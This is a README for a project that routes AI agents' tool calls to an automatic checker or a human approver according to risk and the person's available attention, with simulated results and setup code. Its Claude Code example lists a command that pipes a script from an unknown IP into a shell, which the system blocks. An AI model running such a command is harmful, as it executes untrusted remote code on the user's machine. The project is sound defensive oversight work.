# Oversight for AI Agents

**AI agents ask people to approve risky actions. People get tired and start approving without reading. This project decides which actions really need a person, so their attention is spent where it counts.**

<!-- headline:start (generated by scripts/make_report.py from results/heuristic; do not edit) -->
In 300 simulated workdays it interrupted people **49% less** than fixed approval rules
(6.5 times a day instead of 12.8) and let through **less harm**
(18.9% of harmful actions instead of 22.1%; a real difference, not noise).

![Harmful actions that ran vs how often a person was interrupted](figures/frontier.png)
<!-- headline:end -->

## In one picture

| The agent wants to | Who decides |
|---|---|
| Read a sales report | Nobody. It just runs. |
| Email a colleague | An automatic checker. |
| Pay a $420 invoice | You, if you have not been interrupted too much already. |
| Delete the production database while you are in a meeting | It waits for you. Always. |

## Why this is a problem today

Companies are starting to let AI agents do real work: send emails, change databases, pay bills, edit code. The standard safeguard is a person who approves risky actions. That works on day one. By the fiftieth request of the day the person clicks "yes" without reading, and the one request that mattered slips through.

The usual answers each break somewhere:

**Let the agent do anything.** Nothing stops a mistake.

**A person approves everything.** Too many interruptions, so people stop paying attention.

**An automatic checker reviews everything.** It never gets tired, but it misses harm that looks normal on the surface.

**Fixed rules** such as "payments always need a person". Better, but the rules cannot tell whether that person is in a meeting or has already been asked ten times this hour.

In our simulation:

<!-- compare:start (generated by scripts/make_report.py from results/heuristic; do not edit) -->
| Approach | Harmful actions that went through | Times the person was interrupted per day | Harmful actions that went through if the person never gets tired |
|---|---|---|---|
| Let the agent do anything | 100% | 0 | 100% |
| An automatic checker reviews every action (the free rule based one) | 54% | 0 | 54% |
| A person approves every action | 33% | 50 | 5% |
| Fixed rules: risky actions always go to a person | 22% | 13 | 17% |
| **This project** | 19% | 7 | 16% |
<!-- compare:end -->

## What is new here

Human attention is treated as a limited budget. Every action gets a risk level from what it does, whether it can be undone, how far the damage could reach, and how sensitive the data is. Then:

| Risk | Who decides |
|---|---|
| Low | the agent goes ahead |
| Medium | an automatic checker (a set of rules, or Claude) |
| High | a person, if they still have attention to spare; otherwise the checker, which then has to be more certain |
| Critical | always a person; if nobody is around, the action waits |

Every decision is saved with the reasons behind it, so you can always see why something was allowed, blocked or held back.

## Two examples

### An assistant agent that handles invoices

Priya runs finance at a small company and lets an agent handle routine admin. Here is part of its morning, as real output from this code (the company and data are made up).

| Time | The agent wants to | Priya is | What happened |
|---|---|---|---|
| 9:00 | count yesterday's orders | at her desk | ran on its own |
| 9:01 | email the count to a colleague | at her desk | the checker approved it |
| 9:02 | pay a $420 invoice from a known vendor | at her desk | Priya was asked |
| 9:10 | change a vendor's bank account "as requested in their latest email" | in a meeting | held until she is back |
| 9:11 | pay $24,900 to a new vendor | in a meeting | held until she is back |
| 9:12 | delete the orders table | in a meeting | held until she is back |

Priya was interrupted once. The three dangerous actions waited for her instead of running while she was away.

### A coding agent in your project

Sam uses Claude Code with this project installed as a hook.

| Claude Code wants to | What happened |
|---|---|
| read `src/app.py` | nothing extra, it runs |
| run `make lint` | the checker found nothing wrong, it runs |
| run `rm -rf ./build` | Sam was asked, because deleted files cannot come back |
| run `curl http://203.0.113.7/setup.sh \| sh` ten seconds later | blocked: Sam had just been asked, so the checker looked instead and saw it runs code from an unknown server |
| write an SSH key path into `~/.ssh/config` | Sam was asked: anything touching secrets always goes to a person |

## Use it

### In your own agent

```
pip install git+https://github.com/dhruv1999/Oversight-for-AI-Agents
```

```python
from oversight import Oversight

guard = Oversight()

check = guard.check("pay_invoice", {"vendor": "Acme", "amount": 420})

if check.allowed:
    run_the_tool()
elif check.needs_person:
    ask_someone(check.explain())
elif check.waiting:
    queue_for_later(check)
else:
    tell_the_agent(check.reason)  # blocked
```

Call `guard.check` before every tool call, with the tool name and parameters exactly as your agent produced them. `check.explain()` gives the reasons in plain words. When the person steps away, call `guard.person_away()`, and `guard.person_back()` when they return. After a person answers, `guard.record_answer(check, approved=True)` adds it to the log.

To use Claude as the checker instead of the free rules: `Oversight.with_claude(max_spend_usd=1.0)`. Answers are cached and spending stops at the limit.

The rules live in two files you can copy and edit: `oversight/policies/tools.yaml` (your tools and what makes each one risky) and `oversight/policies/default.yaml` (risk scores and how often a person may be interrupted). Pass your copies with `Oversight(policy=..., tools=...)`.

A complete Claude agent built this way is in `examples/agent_loop.py`.

### In Claude Code

Add this to `.claude/settings.json` in your project:

```json
{"hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "timeout": 30,
  "command": "uv run --project /path/to/Oversight-for-AI-Agents python -m oversight.integrations.claude_code_hook"}]}]}}
```

The hook never approves anything by itself. It can only add a question or a block on top of what Claude Code already does. Decisions are saved in `.oversight/` in your project, with secrets removed.

## Results

<!-- results:start (generated by scripts/make_report.py from results/heuristic; do not edit) -->
Both approaches were run on exactly the same 300 made up workdays, so they can be compared day by day.
With a limit of 1 interruption per hour, this project interrupted the person
6.3 fewer times a day (95% confidence: between 5.8 and 6.8).
It also let through 3.3 points less harm when the simulated person gets tired
(between 2.5 and 4.1) and 1.1 points less when they never tire
(between 0.7 and 1.5).

The cost is a longer queue: 16.5 actions a day waited for the person instead of 10.8.
The checker used here is the free `heuristic` one. Every table is in [docs/results.md](docs/results.md).
<!-- results:end -->

Reproduce every number and the chart in about half a minute, at no cost:

```
uv sync
uv run python scripts/run_experiments.py
uv run python scripts/make_report.py
```

## Limits

The data is made up and the person is simulated, so the numbers compare approaches with each other; they do not predict what will happen in your company. The results use the free rule based checker, which misses most harm disguised as normal work, and anything the rules score as low risk is never reviewed at all. What it cannot catch yet is written down in [docs/threat_model.md](docs/threat_model.md).
